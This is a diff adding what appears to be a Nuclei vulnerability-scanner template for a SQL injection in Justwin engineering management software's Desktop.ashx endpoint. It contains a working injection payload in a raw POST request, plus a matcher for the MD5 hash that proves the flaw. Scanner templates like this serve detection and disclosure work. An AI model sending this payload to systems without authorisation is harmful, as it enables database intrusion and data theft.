@@ -1,0 +1,29 @@
+id: justwin-sql-injection
+
+info:
+  name: Justwin Engineering Project Management Software SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Justwin engineering management software has a SQL injection vulnerability in `Desktop.ashx`. Attackers can exploit this to retrieve database information, including sensitive data.
+  classification:
+    cvss-score: 8.0
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        POST /SysFrame4/Desktop.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        account=1'+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123')),3,32))<0--&method=isChangePwd&pwd=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
